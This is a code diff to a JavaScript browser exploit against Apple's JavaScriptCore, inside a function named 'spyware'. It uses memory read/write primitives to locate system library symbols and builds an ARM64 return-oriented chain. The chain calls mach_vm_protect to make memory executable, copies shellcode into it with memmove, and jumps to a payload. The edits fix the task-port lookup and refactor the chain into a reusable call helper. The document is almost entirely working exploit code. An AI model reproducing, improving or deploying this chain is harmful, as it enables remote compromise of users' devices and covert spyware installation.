@@ -117,7 +117,6 @@ function _writeInt64(i, val)
 
 function spyware(stage1, memory, binary)
 {
-    alert('spyware!')
     var wrapper = document.createElement("div")
     var wrapper_addr = stage1.addrof(wrapper)
 
@@ -206,7 +205,7 @@ function spyware(stage1, memory, binary)
     var libs =
     {
         "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
-        "/usr/lib/system/libsystem_kernel.dylib":                               ["_task_self_trap", "__kernelrpc_mach_vm_protect_trap"],
+        "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
         "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
         "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC30endOfFixedExecutableMemoryPoolE"],
     };
@@ -362,7 +361,9 @@ function spyware(stage1, memory, binary)
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
     var stackloader         = gadgets["stackloader"];
-    var mach_task_self      = syms["_task_self_trap"];
+    var mach_task_self_     = memory.readInt64(syms["_mach_task_self_"]);
+    // zero higher bytes
+    mach_task_self_         = new Int64(mach_task_self_.bytes().map((v, i)=>i<4?v:0));
     var mach_vm_protect     = syms["__kernelrpc_mach_vm_protect_trap"];
     var memmove             = syms["__platform_memmove"];
     var usleep              = syms["_usleep"];
@@ -458,8 +459,7 @@ function spyware(stage1, memory, binary)
     var jmpAddr = Add(psyms["genesis"], shslide);
 
     memory.writeInt64(Add(vtab, 0x18), longjmp);
-    memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
-    memory.writeInt64(Add(el_addr, 0x10), mach_task_self);  // x21 (func)
+    memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)
 
     var arrsz = 0x100000,
         off   =   0x1000;
@@ -467,169 +467,83 @@ function spyware(stage1, memory, binary)
     var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));
 
     var pos = arrsz - off;
-    // after dispatch:
-    arr[pos++] = 0xdead0000;                // unused
-    arr[pos++] = 0xdead0001;                // unused
-    arr[pos++] = 0xdead0002;                // unused
-    arr[pos++] = 0xdead0003;                // unused
-    arr[pos++] = 0xdead0004;                // x22 (unused)
-    arr[pos++] = 0xdead0005;                // x22 (unused)
-    arr[pos++] = 0xdead0006;                // x21 (unused)
-    arr[pos++] = 0xdead0007;                // x21 (unused)
-    arr[pos++] = 0xdead0008;                // x20 (unused)
-    arr[pos++] = 0xdead0009;                // x20 (unused)
-    arr[pos++] = 0xdead000a;                // x19 (unused)
-    arr[pos++] = 0xdead000b;                // x19 (unused)
-    arr[pos++] = 0xdead000c;                // x29 (unused)
-    arr[pos++] = 0xdead000d;                // x29 (unused)
-    arr[pos++] = stackloader.lo();          // x30 (gadget)
-    arr[pos++] = stackloader.hi();          // x30 (gadget)
 
-    // in stackloader:
-    arr[pos++] = 0xdead0010;                // unused
-    arr[pos++] = 0xdead0011;                // unused
-    arr[pos++] = 0xdead0012;                // unused
-    arr[pos++] = 0xdead0013;                // unused
-    arr[pos++] = dispatch.lo();             // x28 (gadget)
-    arr[pos++] = dispatch.hi();             // x28 (gadget)
-    arr[pos++] = 0xdead0014;                // x27 == x5 (unused)
-    arr[pos++] = 0xdead0015;                // x27 == x5 (unused)
-    arr[pos++] = 7;                         // x26 == x4 (prot)
-    arr[pos++] = 0;                         // x26 == x4 (prot)
-    arr[pos++] = 0;                         // x25 == x3 (max flag)
-    arr[pos++] = 0;                         // x25 == x3 (max flag)
-    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
-    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
-    arr[pos++] = 0xdead0016;                // x23 == x0 (skipped)
-    arr[pos++] = 0xdead0017;                // x23 == x0 (skipped)
-    arr[pos++] = codeAddr.lo();             // x22 == x1 (addr)
-    arr[pos++] = codeAddr.hi();             // x22 == x1 (addr)
-    arr[pos++] = mach_vm_protect.lo();      // x21 (func)
-    arr[pos++] = mach_vm_protect.hi();      // x21 (func)
-    arr[pos++] = 0xdead0018;                // x20 (unused)
-    arr[pos++] = 0xdead0019;                // x20 (unused)
-    arr[pos++] = 0xdead001a;                // x19 (unused)
-    arr[pos++] = 0xdead001b;                // x19 (unused)
-    arr[pos++] = 0xdead001c;                // x29 (unused)
-    arr[pos++] = 0xdead001d;                // x29 (unused)
-    // Need to skip the first instruction (4 bytes) of regloader because we already have x0
-    var tmp = Add(regloader, 4);
-    arr[pos++] = tmp.lo();                  // x30 (gadget)
-    arr[pos++] = tmp.hi();                  // x30 (gadget)
+    var add_call = function(func, x0, x1, x2, x3, x4, jump_to) {
+        x0 = x0 || Int64.Zero
+        x1 = x1 || Int64.Zero
+        x2 = x2 || Int64.Zero
+        x3 = x3 || Int64.Zero
+        x4 = x4 || Int64.Zero
+        jump_to = jump_to || stackloader
 
-    // after dispatch:
-    arr[pos++] = 0xdead0020;                // unused
-    arr[pos++] = 0xdead0021;                // unused
-    arr[pos++] = 0xdead0022;                // unused
-    arr[pos++] = 0xdead0023;                // unused
-    arr[pos++] = 0xdead0024;                // x22 (unused)
-    arr[pos++] = 0xdead0025;                // x22 (unused)
-    arr[pos++] = 0xdead0026;                // x21 (unused)
-    arr[pos++] = 0xdead0027;                // x21 (unused)
-    arr[pos++] = 0xdead0028;                // x20 (unused)
-    arr[pos++] = 0xdead0029;                // x20 (unused)
-    arr[pos++] = 0xdead002a;                // x19 (unused)
-    arr[pos++] = 0xdead002b;                // x19 (unused)
-    arr[pos++] = 0xdead002c;                // x29 (unused)
-    arr[pos++] = 0xdead002d;                // x29 (unused)
-    arr[pos++] = stackloader.lo();          // x30 (gadget)
-    arr[pos++] = stackloader.hi();          // x30 (gadget)
+        // in stackloader:
+        arr[pos++] = 0xdead0010;                // unused
+        arr[pos++] = 0xdead0011;                // unused
+        arr[pos++] = 0xdead0012;                // unused
+        arr[pos++] = 0xdead0013;                // unused
+        arr[pos++] = dispatch.lo();             // x28 (gadget for regloader)
+        arr[pos++] = dispatch.hi();             // x28 (gadget for regloader)
+        arr[pos++] = 0xdead0014;                // x27 (unused)
+        arr[pos++] = 0xdead0015;                // x27 (unused)
+        arr[pos++] = x4.lo();                   // x26 == x4 (arg5)
+        arr[pos++] = x4.hi();                   // x26 == x4 (arg5)
+        arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
+        arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
+        arr[pos++] = x2.lo();                   // x24 == x2 (arg3)
+        arr[pos++] = x2.hi();                   // x24 == x2 (arg3)
+        arr[pos++] = x0.lo();                   // x23 == x0 (arg1)
+        arr[pos++] = x0.hi();                   // x23 == x0 (arg1)
+        arr[pos++] = x1.lo();                   // x22 == x1 (arg2)
+        arr[pos++] = x1.hi();                   // x22 == x1 (arg2)
+        arr[pos++] = func.lo();                 // x21 (func)
+        arr[pos++] = func.hi();                 // x21 (func)
+        arr[pos++] = 0xdead0018;                // x20 (unused)
+        arr[pos++] = 0xdead0019;                // x20 (unused)
+        arr[pos++] = 0xdead001a;                // x19 (unused)
+        arr[pos++] = 0xdead001b;                // x19 (unused)
+        arr[pos++] = 0xdead001c;                // x29 (unused)
+        arr[pos++] = 0xdead001d;                // x29 (unused)
+        arr[pos++] = regloader.lo();            // x30 (first gadget)
+        arr[pos++] = regloader.hi();            // x30 (first gadget)
 
-    // in stackloader:
-    arr[pos++] = 0xdead0030;                // unused
-    arr[pos++] = 0xdead0031;                // unused
-    arr[pos++] = 0xdead0032;                // unused
-    arr[pos++] = 0xdead0033;                // unused
-    arr[pos++] = dispatch.lo();             // x28 (gadget)
-    arr[pos++] = dispatch.hi();             // x28 (gadget)
-    arr[pos++] = 0xdead0034;                // x27 == x5 (unused)
-    arr[pos++] = 0xdead0035;                // x27 == x5 (unused)
-    arr[pos++] = 0xdead0036;                // x26 == x4 (unused)
-    arr[pos++] = 0xdead0037;                // x26 == x4 (unused)
-    arr[pos++] = 0xdead0038;                // x25 == x3 (unused)
-    arr[pos++] = 0xdead0039;                // x25 == x3 (unused)
-    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
-    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
-    arr[pos++] = codeAddr.lo();             // x23 == x0 (dst)
-    arr[pos++] = codeAddr.hi();             // x23 == x0 (dst)
-    arr[pos++] = paddr.lo();                // x22 == x1 (src)
-    arr[pos++] = paddr.hi();                // x22 == x1 (src)
-    arr[pos++] = memmove.lo();              // x21 (func)
-    arr[pos++] = memmove.hi();              // x21 (func)
-    arr[pos++] = 0xdead003a;                // x20 (unused)
-    arr[pos++] = 0xdead003b;                // x20 (unused)
-    arr[pos++] = 0xdead003c;                // x19 (unused)
-    arr[pos++] = 0xdead003d;                // x19 (unused)
-    arr[pos++] = 0xdead003e;                // x29 (unused)
-    arr[pos++] = 0xdead003f;                // x29 (unused)
-    arr[pos++] = regloader.lo();            // x30 (gadget)
-    arr[pos++] = regloader.hi();            // x30 (gadget)
+        // after dispatch:
+        arr[pos++] = 0xdead0020;                // unused
+        arr[pos++] = 0xdead0021;                // unused
+        arr[pos++] = 0xdead0022;                // unused
+        arr[pos++] = 0xdead0023;                // unused
+        arr[pos++] = 0xdead0024;                // x22 (unused)
+        arr[pos++] = 0xdead0025;                // x22 (unused)
+        arr[pos++] = 0xdead0026;                // x21 (unused)
+        arr[pos++] = 0xdead0027;                // x21 (unused)
+        arr[pos++] = 0xdead0028;                // x20 (unused)
+        arr[pos++] = 0xdead0029;                // x20 (unused)
+        arr[pos++] = 0xdead002a;                // x19 (unused)
+        arr[pos++] = 0xdead002b;                // x19 (unused)
+        arr[pos++] = 0xdead002c;                // x29 (unused)
+        arr[pos++] = 0xdead002d;                // x29 (unused)
+        arr[pos++] = jump_to.lo();              // x30 (gadget)
+        arr[pos++] = jump_to.hi();              // x30 (gadget)
+    }
 
-    // after dispatch:
-    arr[pos++] = 0xdead0040;                // unused
-    arr[pos++] = 0xdead0041;                // unused
-    arr[pos++] = 0xdead0042;                // unused
-    arr[pos++] = 0xdead0043;                // unused
-    arr[pos++] = 0xdead0044;                // x22 (unused)
-    arr[pos++] = 0xdead0045;                // x22 (unused)
-    arr[pos++] = 0xdead0046;                // x21 (unused)
-    arr[pos++] = 0xdead0047;                // x21 (unused)
-    arr[pos++] = 0xdead0048;                // x20 (unused)
-    arr[pos++] = 0xdead0049;                // x20 (unused)
-    arr[pos++] = 0xdead004a;                // x19 (unused)
-    arr[pos++] = 0xdead004b;                // x19 (unused)
-    arr[pos++] = 0xdead004c;                // x29 (unused)
-    arr[pos++] = 0xdead004d;                // x29 (unused)
-    arr[pos++] = stackloader.lo();          // x30 (gadget)
-    arr[pos++] = stackloader.hi();          // x30 (gadget)
+    add_call(mach_vm_protect,
+        mach_task_self_,    // task
+        codeAddr,           // addr
+        shsz,               // size
+        new Int64(0),       // max flag
+        new Int64(7)        // prot
+    );
 
-    // in stackloader:
-    arr[pos++] = 0xdead0050;                // unused
-    arr[pos++] = 0xdead0051;                // unused
-    arr[pos++] = 0xdead0052;                // unused
-    arr[pos++] = 0xdead0053;                // unused
-    arr[pos++] = dispatch.lo();             // x28 (gadget)
-    arr[pos++] = dispatch.hi();             // x28 (gadget)
-    arr[pos++] = 0xdead0054;                // x27 == x5 (unused)
-    arr[pos++] = 0xdead0055;                // x27 == x5 (unused)
-    arr[pos++] = 0xdead0056;                // x26 == x4 (unused)
-    arr[pos++] = 0xdead0057;                // x26 == x4 (unused)
-    arr[pos++] = 0xdead0058;                // x25 == x3 (unused)
-    arr[pos++] = 0xdead0059;                // x25 == x3 (unused)
-    arr[pos++] = 0xdead005a;                // x24 == x2 (unused)
-    arr[pos++] = 0xdead005b;                // x24 == x2 (unused)
-    arr[pos++] = 100000;                    // x23 == x0 (microseconds)
-    arr[pos++] = 0;                         // x23 == x0 (microseconds)
-    arr[pos++] = 0xdead005c;                // x22 == x1 (unused)
-    arr[pos++] = 0xdead005d;                // x22 == x1 (unused)
-    arr[pos++] = usleep.lo();               // x21 (func)
-    arr[pos++] = usleep.hi();               // x21 (func)
-    arr[pos++] = 0xdead005e;                // x20 (unused)
-    arr[pos++] = 0xdead005f;                // x20 (unused)
-    arr[pos++] = 0xdead0060;                // x19 (unused)
-    arr[pos++] = 0xdead0061;                // x19 (unused)
-    arr[pos++] = 0xdead0062;                // x29 (unused)
-    arr[pos++] = 0xdead0063;                // x29 (unused)
-    arr[pos++] = regloader.lo();            // x30 (gadget)
-    arr[pos++] = regloader.hi();            // x30 (gadget)
+    add_call(memmove,
+        codeAddr,           // dst
+        paddr,              // src
+        shsz                // size
+    );
 
-    // after dispatch:
-    arr[pos++] = 0xdead0070;                // unused
-    arr[pos++] = 0xdead0071;                // unused
-    arr[pos++] = 0xdead0072;                // unused
-    arr[pos++] = 0xdead0073;                // unused
-    arr[pos++] = 0xdead0074;                // x22
-    arr[pos++] = 0xdead0075;                // x22
-    arr[pos++] = 0xdead0076;                // x21
-    arr[pos++] = 0xdead0077;                // x21
-    arr[pos++] = 0xdead0078;                // x20
-    arr[pos++] = 0xdead0079;                // x20
-    arr[pos++] = codeAddr.lo();             // x19
-    arr[pos++] = codeAddr.hi();             // x19
-    arr[pos++] = 0xdead007a;                // x29
-    arr[pos++] = 0xdead007b;                // x29
-    arr[pos++] = jmpAddr.lo();              // x30 (payload)
-    arr[pos++] = jmpAddr.hi();              // x30 (payload)
+    add_call(usleep,
+        new Int64(100000), // microseconds
+        null, null, null, null, null,
+        jmpAddr
+    );
 
     // dummy
     for(var i = 0; i < 0x20; ++i)
